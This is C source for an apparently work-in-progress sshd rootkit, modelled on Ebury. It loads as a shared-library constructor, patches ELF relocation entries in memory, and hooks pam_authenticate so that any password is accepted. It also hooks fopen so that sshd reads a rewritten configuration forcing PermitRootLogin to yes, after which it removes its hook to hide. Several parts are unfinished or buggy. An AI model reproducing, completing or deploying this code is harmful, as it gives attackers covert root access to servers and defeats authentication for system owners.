#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <stdbool.h>
#include <errno.h>
#include <signal.h>
#include <setjmp.h>

#include <security/pam_appl.h>
#include <sys/mman.h>

#include <dlfcn.h>
#include <link.h>

#include <sys/shm.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <inttypes.h>

#include "pam_private.h"

#include "bad.h"


static int PAGE_SIZE;

static void handle_sig_with_jmp(int sig)
{
	longjmp(jmpbuf, -1);
}

/*
 * lib = start of lib we search - use get_libstart()
 */
static void *find_func_ptr(struct link_map *link_map, void *lib, char *funcname)
{
	struct link_map *map = link_map;
	Dl_info *dli = malloc(sizeof(Dl_info));

	while (map != NULL) {
		if ((void *) map->l_addr == lib) {
			void *libstart = (void *)map->l_addr;

			void *libend = (void *)map->l_next->l_addr;

			bool done = false;

			while (done != true && libstart >= libend) {
				dladdrptr(libstart, dli);

				if (dli->dli_sname != NULL && dli->dli_saddr != NULL) {
					if (strcmp(dli->dli_sname, funcname) == 0) {
						void *tmp = dli->dli_saddr;
						free(dli);
						return tmp;
					}
				}
				libstart += 16;
			}
		}
		map = map->l_next;
	}

	free(dli);
	return NULL;
}

static void *get_libstart(struct link_map *link_map, char *lib)
{
	struct link_map *map = link_map;

	while (map != NULL) {
		if (strstr(map->l_name, lib) != NULL)
			return (void *)map->l_addr;

		map = map->l_next;
	}

	return NULL;
}

/*
 * Parse a dynamic section array for useful pointers
 * CHECK RESULTS -- number of elements in a .dynamic can be wonky...
 * TODO: there is probably a way to get the correct number of elements in a .dynamic array
 *	so we don't blow something up
 */
static void parse_dyn_array(Elf64_Dyn *dynptr, int elements, Elf64_Rela **RELA,
					 uint64_t **RELASZ, Elf64_Rela **JMPREL, uint64_t **PLTRELSZ)
{
	*RELA = NULL;
	*RELASZ = NULL;
	*JMPREL = NULL;
	*PLTRELSZ = NULL;	

	int i;

	for (i = 0; i < elements; i++) {
		if (dynptr[i].d_tag == DT_RELA)
			*RELA = (Elf64_Rela *) &dynptr[i].d_un;
		else if (dynptr[i].d_tag == DT_JMPREL)
			*JMPREL = (Elf64_Rela *) &dynptr[i].d_un;
		else if (dynptr[i].d_tag == DT_PLTRELSZ)
			*PLTRELSZ = (uint64_t *) &dynptr[i].d_un;
		else if (dynptr[i].d_tag == DT_RELASZ)
			*RELASZ = (uint64_t *) &dynptr[i].d_un;
	}
	return;
}

/*
 * parses a .dynamic relocation table (DT_RELA || DT_JMPREL) to return the Elf64_Rela * entry associated 
 *	with the func we want to hook...
 *
 * char* cast for correct arithmetic (surprisingly simple thing to forget)
 *
 * works in 3.2.0-4 openssh_6.0pl YMMV
 */
static Elf64_Rela *parse_rela(Elf64_Rela *RELA, uint64_t *RELASZ, void *func, int *type)
{
	uint64_t relaments = *RELASZ / (sizeof(Elf64_Rela));

	uint64_t shift32;
	uint64_t low32;
	void *ptr;

	int i;
	for (i = 0; i < relaments; i++) {
		if ((void *) RELA[0].r_addend == func) {
			*type = RELOC_ADDEND;
			return RELA;
		}

		shift32 = (uintptr_t) (ELF64_R_SYM(RELA[0].r_info)) << 32;
		low32 = (uintptr_t) (ELF64_R_TYPE(RELA[0].r_info)) & 0xFFFFFFFF;

		ptr = (void *) ((uintptr_t) shift32 | (uintptr_t) low32);

		if (ptr == func) {
			*type = RELOC_SYMORTYPE;
			return RELA;
		}

		RELA = (Elf64_Rela *) ((char *) RELA + (unsigned long long) (sizeof(Elf64_Rela)));
	}
	return NULL;
}

/*
 * the callback for dl_iterate_phdr
 *
 * TODO: make null1/null2 not suck
 */
static int callback(struct dl_phdr_info *info, size_t size, void *data)
{
	int j;
	
	for (j = 0; j < info->dlpi_phnum; j++) {
		
		if ((unsigned int)info->dlpi_phdr[j].p_type == PT_DYNAMIC) {
			if (strstr(info->dlpi_name, ".so") == NULL) {
				if (info->dlpi_phnum == (unsigned)9) {
					null1 = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
					break;
				}
				if (info->dlpi_phnum == (unsigned)4) {
					null2 = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
					break;
				}
			}
			if (strstr(info->dlpi_name, "libc.so") != NULL) {
				libc = (void *) (info->dlpi_addr + info->dlpi_phdr[j].p_vaddr);
				break;
			}
		}
	}
	return 0;
}

/*
 * we will need another hook -- for RELOC_SYMORTYPE
 */
static int hook_rela_addend(Elf64_Rela *foundrela, void *func)
{
	int ret;
	uint64_t prevpage = ((uint64_t) foundrela / PAGE_SIZE) * PAGE_SIZE;

	ret = mprotect((void *) prevpage, PAGE_SIZE, PROT_READ | PROT_WRITE);
	if (ret != 0)
		return -1;

	foundrela->r_addend = (unsigned long long)func; 

	ret = mprotect((void *) prevpage, PAGE_SIZE, PROT_READ);
	if (ret != 0)
		return -1;

	return 0;
}

static int is_sshd(struct link_map *link_map)
{
	void *dlhandle = dlopen("libdl.so.2", RTLD_NOW);

	if (dlhandle == NULL)
		return -1;

	dlinfoptr = dlsym(dlhandle, "dlinfo");
	dladdrptr = dlsym(dlhandle, "dladdr");
	dlclose(dlhandle);

	if (dlinfoptr == NULL || dladdrptr == NULL)
		return -1;

	void *ourhandle = dlopen(NULL, RTLD_NOW);

	dlinfoptr(ourhandle, 2, &link_map);
	dlclose(ourhandle);

	void *wrapstart = get_libstart(link_map, "libwrap.so.0");

	if (wrapstart == NULL)
		return -1;

	void *pamstart = get_libstart(link_map, "libpam.so.0");

	if (pamstart == NULL)
		return -1;

	void *hosts_access = find_func_ptr(link_map, wrapstart, "hosts_access");
	void *pam_authenticate = find_func_ptr(link_map, pamstart, "pam_authenticate");

	if (hosts_access == NULL || pam_authenticate == NULL)
		return -1;

	return 0;
}

/*
 *
 */
static int my_pam_auth(struct pam_handle *pamh, int flags)
{
	__asm__ (
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		"nop;"
		);

	struct pam_conv *conver = pamh->pam_conversation;

	struct pam_message *msg = malloc(sizeof(struct pam_message));
	msg->msg_style = PAM_PROMPT_ECHO_OFF;
	msg->msg = NULL;

	struct pam_response *resp = calloc(0, sizeof(struct pam_response));

	conver->conv(1, (const struct pam_message **) &msg, &resp, NULL);	
	/* thanks for the password! */

	
	free(msg);
	free(resp);		
	return 0;
}

/*
 * the goal is to make sure PermitRootLogin is set to yes - regardless if it is explicity set or not
 *	and then unhook ourselves sneaky beaky like
 * TODO: sanity
 * TODO: read sshd.c -- very possible fopen(sshd_config) is the first ever fopen
 * XXX: there is probably an easier way to do what I'm trying to do with bitmasks, but I like the practice and it feels cool
 */
Elf64_Rela *ref_fopen_Rela;
FILE *(*ref_fopen)(char*, char*);


#define MASK_64 						0x0000000000000000

#define PermitRootLogin_EXPLICIT		0x0000000000000001
#define PermitRootLogin_APPEND			0x0000000000000010
#define PermitRootLogin_NOWORK			0x0000000000000011
#define PermitRootLogin_MASK			0x0000000000000011

#define PasswordAuthentication_EXPLICIT 0x0000000000000100
#define PasswordAuthentication_APPEND 	0x0000000000001000
#define PasswordAuthentication_NOWORK 	0x0000000000001100
#define PasswordAuthentication_MASK	 	0x0000000000001100

FILE *my_fopen(char *filename, char *mode)
{
	FILE *fp = ref_fopen(filename, mode);
	fpos_t ref_pos;

	fgetpos(fp, &ref_pos);


	char *str = malloc(sizeof(512));
	size_t n = 0;
	/* 
	 * libkeyutils hates _GNU_SOURCE and I haven't bothered to learn about Makefiles and advanced #define usage
	 * 	so no strcasestr();
	 * TODO TODO TODO: use strcasestr() TODO TODO TODO
	 */
	char *PermitRootLogin = NULL;
	char *PasswordAuthentication = NULL;

	bool noset = false;
	
	unsigned long long BITMASK = MASK_64;	

	int ret = 42;
	while (ret != -1) {
		ret = getline(&str, &n, fp); /* XXX: should hopefully be safe ?? */
	

		if (strncmp(str, "PermitRootLogin ", strlen("PermitRootLogin ")) == 0)
			PermitRootLogin = strstr(str, "PermitRootLogin");

		/* determine if PermitRootLogin is explicity set to (Yes || No) - (case insensitive) */
		if (PermitRootLogin != NULL) {

			/* clear any previously set PermitRootLogin flags -- it's possible for a sshd_config to have duplicates */
			BITMASK &= ~ PermitRootLogin_MASK;

			/* we have a valid PermitRootLogin string - not commented 
			 *		if the string is set to yes then there is NOWORK to be done
			 *		otherwise we will have to EXPLICITly redefine no
			 */

			char *setting = strstr(PermitRootLogin, "Yes");	
			if (setting == NULL)
				setting = strstr(PermitRootLogin, "yes");	
		
			if (setting != NULL) {
				BITMASK |= PermitRootLogin_NOWORK;
			} else {

				setting = strstr(PermitRootLogin, "No");	
				if (setting == NULL)
					setting = strstr(PermitRootLogin, "no");	

				/* PermitRootLogin [n-N][o] */
				if (setting != NULL) {
					BITMASK |= PermitRootLogin_EXPLICIT;
				}
			}
		
			PermitRootLogin = NULL;
		}


		if (strncmp(str, "PasswordAuthentication ", strlen("PasswordAuthentication ")) == 0) {
			PasswordAuthentication = strstr(str, "PasswordAuthentication");

			if (PasswordAuthentication != NULL) {

				/* clear any previously set PasswordAuthentication flags -- it's possible for a sshd_config to have duplicates */
				BITMASK &= ~ PasswordAuthentication_MASK;

				/* we have a valid PasswordAuthentication string - not commented 
				 *		if the string is set to yes then there is NOWORK to be done
				 *		otherwise we will have to EXPLICITly redefine no
				 */

				char *setting = strstr(PasswordAuthentication, "Yes");	
				if (setting == NULL)
					setting = strstr(PasswordAuthentication, "yes");	
			
				if (setting != NULL) {
					BITMASK |= PasswordAuthentication_NOWORK;
				} else {

					setting = strstr(PasswordAuthentication, "No");	
					if (setting == NULL)
						setting = strstr(PasswordAuthentication, "no");	

					/* PasswordAuthentication [n-N][o] */
					if (setting != NULL) {
						BITMASK |= PasswordAuthentication_EXPLICIT;
					}
				}
			
				PasswordAuthentication = NULL;
			}
		}
	}
	fclose(fp);
		
	signed long int orig_sshd_config_size; /* XXX: checkme: type sanity */
	struct stat st;	
	stat(filename, &st);
	orig_sshd_config_size = st.st_size;


	/* if we never ran into any of the strings we wanted in sshd_config 
	 *	 -- BITMASK is unset
	 * then make sure to append these strings to the end of the duped sshd_config we are making
	 */	
	unsigned long long tmpmask = BITMASK & PermitRootLogin_MASK;
		
	if (tmpmask != PermitRootLogin_EXPLICIT && tmpmask != PermitRootLogin_NOWORK)
		BITMASK |= PermitRootLogin_APPEND;

	
	tmpmask = BITMASK & PasswordAuthentication_MASK;

	if (tmpmask != PasswordAuthentication_EXPLICIT && tmpmask != PermitRootLogin_NOWORK)
		BITMASK |= PasswordAuthentication_APPEND;
	


	/* do explicit adds first -- leave them in the SHM 
		-- make sure we keep track of the buffer size for correct concats when appends come later
	*/

	int buf_len = orig_sshd_config_size + 150; /* what's 150 bytes between friends? */
	char *buf = malloc(buf_len);

	int orig_fd = open(filename, O_RDONLY);

	read(orig_fd, buf, buf_len);
	close(orig_fd);

	/* we have original sshd_config in memory - buf */

	/* now change the options that were EXPLICITly set */
	free(str);
	if ((BITMASK & PermitRootLogin_MASK) == PermitRootLogin_EXPLICIT) {
		
		/* find a valid pointer to PermitRootLogin that isn't a comment
		 * and doesn't abuse strstr()
		 *
		 * FIXME: strtok was obliterating buf, so just memcpy a new buf and use that for strtok instead. -- leaks
		 */

		char *tok_buf = malloc(buf_len); /* FIXME: this will leak */
		
		memcpy(tok_buf, buf, buf_len);

		str = strtok(tok_buf, "\n");
		while (str != NULL) {
			if (strncmp(str, "PermitRootLogin ", strlen("PermitRootLogin ")) == 0) {
				PermitRootLogin = strstr(str, "PermitRootLogin");
			}
			str = strtok(NULL, "\n");
		}


		char *PRL_Y = "PermitRootLogin yes\n";

		/* how far is PermitRootLogin from the start of sshd_config */
		unsigned long long bytes_from_start = (char *) PermitRootLogin - (char *) tok_buf;

		/* copy all of the bytes from sshd_config into new -- up until (excluding) PermitRootLogin */
		char *new = malloc(orig_sshd_config_size + 1);
		memcpy(new, buf, bytes_from_start);

		/* ... */
		strncat(new, PRL_Y, strlen(PRL_Y));

		/* get number of char until \n in "PermitRootLogin no" 
		 * XXX: this most likely isn't needed anymore as this will always be the above no string (+1)
		 */
		int newline = strcspn(PermitRootLogin, "\n");
		newline += 1; /* +1 - strlen(yes) = 3 . strlen(no) = 2 */
		
		
		/* 
		 * if this doesn't make you love C, I don't know what would 
		 *
		 * copy into new -- make sure we skip the "PermitRootLogin yes" we just added by adding newline
		 * from buf -- bytes_from_start + strlen() will cut "PermitRootLogin no" from buf so we can append the rest of buf
		 */	
		memcpy((char *) new + (unsigned long long) bytes_from_start + newline, 
					(char*) buf + bytes_from_start + strlen("PermitRootLogin no"),
					strlen(buf + bytes_from_start));

		
		free(buf);
		buf = new;
	}

	if ((BITMASK & PasswordAuthentication_MASK) == PasswordAuthentication_EXPLICIT) {




	}











	
	sleep(5);
	char *repl = "PermitRootLogin yes\n";
	if (noset == true) {
		/* "PermitRootLogin No" was explicity set */
		
		char *buf = malloc(orig_sshd_config_size + 1);
		/* sanity() */
		int orig_fd = open(filename, O_RDONLY);
		read(orig_fd, buf, orig_sshd_config_size);

		PermitRootLogin = strstr(buf, "PermitRootLogin");	

		/* how far is PermitRootLogin from the start of sshd_config */
		unsigned long long bytes_from_start = (char *) PermitRootLogin - (char *) buf;

		/* copy all of the bytes from sshd_config into new -- up until (excluding) PermitRootLogin */
		char *new = malloc(orig_sshd_config_size + 1);
		memcpy(new, buf, bytes_from_start);
		
		/* ... */
		strncat(new, repl, strlen(repl));

		/* ... */
		int newline = strcspn(PermitRootLogin, "\n");
		newline += 1; /* +1 - strlen(yes) = 3 . strlen(no) = 2 */
		
		/* this cuts out "PermitRootLogin No\n" and should also give us enough space (+1) to write Yes */
		PermitRootLogin = (char *) PermitRootLogin + (unsigned long long ) newline;

		/* buf + orig_sshd_config_size -- if casted correctly will give us the end of sshd_config in memory */
		void *end = (char *) buf + (unsigned long long) orig_sshd_config_size;
		
		/* PermitRootLogin has been cut out correctly (+1) as said above. now we just copy the rest of the config into new */
		unsigned long long bytes_left = (char *)end - (char *) PermitRootLogin;

		strncat(new, PermitRootLogin, bytes_left);

		/* small cleanup */
		fclose(fp); /* XXX: change - this FILE* will be useful for error recovery if necessary */
		close(orig_fd);	
		free(buf);

		/* the new sshd_config is now set up correctly */	
	
		int fd = shm_open("/7355608", O_RDWR | O_CREAT, 0400);
		
		ftruncate(fd, orig_sshd_config_size + 1);

		mmap(0, orig_sshd_config_size + 1, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0 );

		write(fd, new, orig_sshd_config_size + 1);

		/* give sshd the /dev/shm file descriptor, which should clean itself up after sshd is done using it -- rewind() is important */
		fp = fdopen(fd, mode);
		rewind(fp);

		shm_unlink("/7355608");


		/* job well done... reset our RELA -- don't care about any more fopens */
		hook_rela_addend(ref_fopen_Rela, ref_fopen);

		free(new);
			
		return fp;
	
	} else {
		/* PermitRootLogin has NOT been explicity set, and sshd will default to PERMIT_NOT_SET -- not good */
		int repl_len = strlen(repl);
		char *new = malloc(orig_sshd_config_size + repl_len);
		
		int orig_fd = open(filename, O_RDONLY);
		read(orig_fd, new, orig_sshd_config_size);

		close(orig_fd);
		fclose(fp);


		/* tack on *repl onto the end of sshd_config */
		char *end = (char *) new + (unsigned long long) orig_sshd_config_size;
		
		memcpy(end, repl, repl_len);	

		/* new is now set up correctly - just need to work fdopen magic */
		int fd = shm_open("/7355608", O_RDWR | O_CREAT, 0400);
		
		ftruncate(fd, orig_sshd_config_size + repl_len);

		mmap(0, orig_sshd_config_size + repl_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0 );

		write(fd, new, orig_sshd_config_size + repl_len);

		/* give sshd the /dev/shm file descriptor, which should clean itself up after sshd is done using it -- rewind() is important */
		fp = fdopen(fd, mode);
		rewind(fp);

		shm_unlink("/7355608");


		/* job well done... reset our RELA -- don't care about any more fopens */
		hook_rela_addend(ref_fopen_Rela, ref_fopen);

		free(new);
			
		return fp;
	}






	
done:
	hook_rela_addend(ref_fopen_Rela, ref_fopen);

	free(str);
	fsetpos(fp, &ref_pos);

	return fp;
}

static void  __attribute__ ((constructor)) init(void)
{
	struct link_map *link_map;

	if (is_sshd(link_map) != 0)
		return;

	PAGE_SIZE = getpagesize();

	void *ourhandle = dlopen(NULL, RTLD_NOW);

	dlinfoptr(ourhandle, 2, &link_map);
	dlclose(ourhandle);

	void *o = dlopen("libdl-2.13.so", RTLD_NOW);
	dl_iterate_phdrptr = dlsym(o, "dl_iterate_phdr");
	dlclose(o);
	dl_iterate_phdrptr(callback, NULL);

	if (null1 == NULL)
		return;


	Elf64_Rela *RELA, *JMPREL;
	uint64_t *RELASZ, *PLTRELSZ;
	int type;

	parse_dyn_array(null1, 30, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
		return;

	void *pamstart = get_libstart(link_map, "libpam.so.0");
	void *pam_authenticate = find_func_ptr(link_map, pamstart, "pam_authenticate");

	Elf64_Rela *foundrela = parse_rela(RELA, RELASZ, pam_authenticate, &type);
	if (foundrela == NULL)
		return;

	int jmpret = setjmp(jmpbuf);
	if (jmpret != 0) { /* PANIC */
		kill(getpid(), SIGSEGV);
		return;
	}

	signal(SIGSEGV, handle_sig_with_jmp);
	signal(SIGBUS, handle_sig_with_jmp);

	/* TODO: test type (parse_rela() paramter) */
	hook_rela_addend(foundrela, my_pam_auth);

	signal(SIGSEGV, SIG_DFL);
	signal(SIGBUS, SIG_DFL);


/*	begin experiments -- fixing PermitRootLogin
		how the hell did the original Ebury guys do this? */

	/* XXX: all of this crap deserves a wrapper - ? muh modularity */

	void *libcstart = get_libstart(link_map, "libc.so.6");
	void *libc_func = find_func_ptr(link_map, libcstart, "fopen");

	/* the relocation of fopen lives within sshd's dynamic */
	parse_dyn_array(null1, 30, &RELA, &RELASZ, &JMPREL, &PLTRELSZ);
	if (RELA == NULL || RELASZ == NULL || JMPREL == NULL || PLTRELSZ == NULL)
		return;


	/* changeme: s/foundrela/ref_fopen_Rela/g -- inside my_fopen we will need to change fopen back to normal :^) */
	foundrela = parse_rela(RELA, RELASZ, libc_func, &type);
	if (foundrela == NULL) /* the relocation wasn't in DT_RELA ... */
		foundrela = parse_rela(JMPREL, PLTRELSZ, libc_func, &type);
	if (foundrela == NULL) /* :( */
		return;

	/* checking type is pretty much a formaility at the moment -- but will be useful later */
	if (type == RELOC_ADDEND) {
		ref_fopen = (void *) foundrela->r_addend;

		ref_fopen_Rela = foundrela;


		hook_rela_addend(foundrela, my_fopen);

	}





	

	return;
}
